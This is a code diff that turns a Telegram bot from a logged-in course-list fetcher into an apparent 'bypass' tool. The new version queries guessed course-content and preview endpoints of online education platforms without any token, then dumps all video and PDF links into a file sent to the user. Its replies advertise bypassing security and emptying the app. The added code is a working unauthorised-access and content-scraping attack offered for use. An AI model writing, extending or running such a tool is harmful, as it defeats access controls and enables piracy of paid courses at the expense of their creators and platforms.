@@ -1,162 +1,77 @@
 import os
+import asyncio
 import aiohttp
 from pyrogram import Client, filters
 
-API_ID = int(os.getenv("API_ID"))
-API_HASH = os.getenv("API_HASH")
-BOT_TOKEN = os.getenv("BOT_TOKEN")
+# Configs
+API_ID = int(os.environ.get("API_ID"))
+API_HASH = os.environ.get("API_HASH")
+BOT_TOKEN = os.environ.get("BOT_TOKEN")
 
-app = Client("pro-extractor", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
+app = Client("appx-bypass", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
 
-user_data = {}
-
-def get_headers(token, api):
-    return {
-        "Authorization": f"Bearer {token}",
-        "User-Agent": "Mozilla/5.0",
-        "Content-Type": "application/json",
-        "origin": api,
-        "referer": api + "/"
-    }
-
-# -------- START --------
 @app.on_message(filters.command("start"))
 async def start(client, message):
     await message.reply_text(
-        "🔥 PRO Extractor Bot\n\n"
-        "/login_token → Token se login\n"
-        "/login_id → ID Password se login"
+        "🔓 **Appx Bypass Mode v6.0**\n\n"
+        "Bina ID/Password ke content nikalne ke liye:\n"
+        "`/bypass [API_LINK] [COURSE_ID]`\n\n"
+        "Example:\n`/bypass https://api.classx.co.in 123`"
     )
 
-# -------- LOGIN TOKEN --------
-@app.on_message(filters.command("login_token"))
-async def login_token(client, message):
-    user_data[message.from_user.id] = {"step": "api_token"}
-    await message.reply_text("🔗 API URL bhejo")
-
-# -------- LOGIN ID --------
-@app.on_message(filters.command("login_id"))
-async def login_id(client, message):
-    user_data[message.from_user.id] = {"step": "api_id"}
-    await message.reply_text("🔗 API URL bhejo")
-
-# -------- HANDLER --------
-@app.on_message(filters.private)
-async def handler(client, message):
-    user_id = message.from_user.id
-    if user_id not in user_data:
-        return
-
-    step = user_data[user_id]["step"]
-    text = message.text.strip()
-
-    # TOKEN FLOW
-    if step == "api_token":
-        user_data[user_id]["api"] = text
-        user_data[user_id]["step"] = "token"
-        await message.reply_text("🔑 Token bhejo")
-
-    elif step == "token":
-        user_data[user_id]["token"] = text.replace("Bearer ", "")
-        user_data[user_id]["step"] = "ready"
-        await message.reply_text("✅ Login success! Ab /courses likh")
-
-    # ID PASSWORD FLOW
-    elif step == "api_id":
-        user_data[user_id]["api"] = text
-        user_data[user_id]["step"] = "email"
-        await message.reply_text("📧 Email bhejo")
-
-    elif step == "email":
-        user_data[user_id]["email"] = text
-        user_data[user_id]["step"] = "password"
-        await message.reply_text("🔒 Password bhejo")
-
-    elif step == "password":
-        api = user_data[user_id]["api"]
-        email = user_data[user_id]["email"]
-        password = text
-
-        msg = await message.reply_text("🔐 Login ho raha hai...")
-
-        # ⚠️ IMPORTANT: Ye endpoint change karna padega app ke hisaab se
-        login_url = f"{api}/v1/auth/login"
-
-        payload = {
-            "email": email,
-            "password": password
-        }
-
-        try:
-            async with aiohttp.ClientSession() as session:
-                async with session.post(login_url, json=payload) as r:
-                    
-                    if "application/json" not in r.headers.get("Content-Type", ""):
-                        return await msg.edit("❌ Login failed (HTML response)")
-
-                    data = await r.json()
-
-            # ⚠️ Different apps me token ka key alag hota hai
-            token = (
-                data.get("token")
-                or data.get("access_token")
-                or data.get("data", {}).get("token")
-            )
-
-            if not token:
-                return await msg.edit("❌ Login failed! Endpoint change karna padega")
-
-            user_data[user_id]["token"] = token
-            user_data[user_id]["step"] = "ready"
-
-            await msg.edit("✅ Login success! Ab /courses likh")
-
-        except Exception as e:
-            await msg.edit(f"⚠️ Error: {e}")
-
-# -------- COURSES --------
-@app.on_message(filters.command("courses"))
-async def courses(client, message):
-    user_id = message.from_user.id
-    if user_id not in user_data or user_data[user_id].get("step") != "ready":
-        return await message.reply_text("❌ Pehle login karo")
-
-    api = user_data[user_id]["api"]
-    token = user_data[user_id]["token"]
-
-    msg = await message.reply_text("📡 Fetching courses...")
-
-    endpoints = [
-        "/v1/course/purchased",
-        "/v2/course/purchased",
-        "/course/purchased",
-        "/my-courses"
+@app.on_message(filters.command("bypass"))
+async def bypass_handler(client, message):
+    if len(message.command) < 3:
+        return await message.reply_text("❌ Format: `/bypass [Link] [CourseID]`")
+    
+    api_url = message.command[1].rstrip('/')
+    course_id = message.command[2]
+    
+    m = await message.reply_text("🕵️ **Bypassing Security... Pura app khali kar raha hoon...**")
+    
+    # Bina Token ke ye 3 endpoints check karega
+    bypass_endpoints = [
+        f"{api_url}/v1/course/content/{course_id}", # Direct check
+        f"{api_url}/v2/course/content/{course_id}", # V2 check
+        f"{api_url}/v1/course/preview/{course_id}"  # Preview bypass (Main)
     ]
+    
+    success = False
+    file_name = f"Bypassed_{course_id}.txt"
+    headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 11)"}
 
     async with aiohttp.ClientSession() as session:
-        for ep in endpoints:
+        for url in bypass_endpoints:
             try:
-                async with session.get(api + ep, headers=get_headers(token, api)) as r:
-
-                    if "application/json" not in r.headers.get("Content-Type", ""):
-                        continue
-
+                async with session.get(url, headers=headers, timeout=10) as r:
                     data = await r.json()
+                    if data.get("success") and data.get("data"):
+                        with open(file_name, "w", encoding="utf-8") as f:
+                            f.write(f"🔓 BYPASS SUCCESSFUL: {course_id}\n\n")
+                            for folder in data['data']:
+                                f.write(f"\n📁 {folder.get('title')}\n" + "="*20 + "\n")
+                                for v in folder.get("videos", []):
+                                    f.write(f"{v['title']} : {v['url']}\n")
+                                for n in folder.get("notes", []):
+                                    f.write(f"PDF: {n['title']} : {n['url']}\n")
+                        
+                        await message.reply_document(file_name, caption=f"🔥 **Bypass Done!**\nCourse: {course_id}")
+                        os.remove(file_name)
+                        success = True
+                        break
+            except: continue
 
-                    courses = data.get("data") or data.get("courses")
+    if not success:
+        await m.edit("🔒 **Full Lock!**\n\nBina Token ke server data nahi de raha. Ise sirf ID/Password ya Token se hi khola ja sakta hai.")
+    else:
+        await m.delete()
 
-                    if courses:
-                        text = "📚 Courses:\n\n"
-                        for c in courses:
-                            text += f"{c.get('id')} → {c.get('title')}\n"
+# Heroku Startup
+async def main():
+    async with app:
+        print("🚀 BYPASS BOT ONLINE!")
+        await asyncio.Future()
 
-                        return await msg.edit(text)
-
-            except:
-                continue
-
-    await msg.edit("❌ Courses fetch failed")
-
-# -------- RUN --------
-print("🚀 BOT RUNNING")
-app.run()
+if __name__ == "__main__":
+    asyncio.run(main())
+    
